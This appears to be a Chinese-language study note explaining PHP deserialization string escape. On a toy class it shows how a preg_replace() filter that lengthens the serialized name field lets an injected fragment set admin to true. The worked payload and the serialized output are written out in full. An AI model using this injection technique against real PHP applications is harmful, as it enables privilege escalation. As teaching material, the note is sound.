---
title: PHP 相关漏洞
---

# php反序列化字符串逃逸
2026/11/20

关键函数： `preg_replace()`

功能：字符串替换

```php

$s = 'abc123!@#';
$s = preg_replace('/!@#/', 'defg', $s);   // 3 字节 → 4 字节
echo $s; // abc123defg

```

```php


class U { 
public $name = ''; 
public $admin = false; 
}


```

```php


$u = new U();
$u->name = 'xxxxxxxxxxxxxxxxxxx";s:5:"admin";b:1;}'; //19个x 因为注入片段 ";"s:5:"admin";b:1;} 共 19 字节,每个 x 替换后净增 1 字节。

$s = serialize($u);  //序列化字符串：O:1:"U":2:{s:4:"name";s:38:"xxxxxxxxxxxxxxxxxxx";s:5:"admin";b:1;}";s:5:"admin";b:0;}
$s = preg_replace('/x/', 'xx', $s);   // 19 个 x → 38 个 O:1:"U":2:{s:4:"name";s:38:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:5:"admin";b:1;}";s:5:"admin";b:0;}

$u2 = unserialize($s);
var_dump($u2->admin);                 // bool(true) ← 注入成功


```

```text

O:1:"U":2:{s:4:"name";s:38:"xxxxxxxxxxxxxxxxxxx";s:5:"admin";b:1;}";s:5:"admin";b:0;}
O:1:"U":2:{s:4:"name";s:38:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:5:"admin";b:1;}";s:5:"admin";b:0;}

```

经过`preg_replace()`后，name的长度变长了，但声明的大小没变，所以后面的`";s:5:"admin";b:1;}`会溢出，溢出部分被 unserialize 当作“新的属性”来解析，`O:1:"U":2:{s:4:"name";s:38:"xxx...xx";s:5:"admin";b:1;}`

所以就利用了反序列化漏洞将admin的值改成了true
